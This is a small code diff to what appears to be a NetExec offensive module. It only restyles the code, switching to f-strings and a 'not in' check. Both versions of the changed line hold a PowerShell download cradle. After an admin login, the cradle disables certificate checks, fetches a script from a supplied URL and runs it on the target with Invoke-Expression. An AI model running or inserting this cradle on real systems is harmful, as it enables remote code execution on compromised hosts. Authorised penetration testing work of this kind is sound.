@@ -1,6 +1,3 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-
 from sys import exit
 
 
@@ -23,8 +20,7 @@ class NXCModule:
         URL  URL for the download cradle
         PAYLOAD  Payload architecture (choices: 64 or 32) Default: 64
         """
-
-        if not "URL" in module_options:
+        if "URL" not in module_options:
             context.log.fail("URL option is required!")
             exit(1)
 
@@ -38,7 +34,7 @@ class NXCModule:
             self.payload = module_options["PAYLOAD"]
 
     def on_admin_login(self, context, connection):
-        ps_command = """[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('{}');""".format(self.url)
+        ps_command = f"""[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('{self.url}');"""
         if self.payload == "32":
             connection.ps_execute(ps_command, force_ps32=True)
         else:
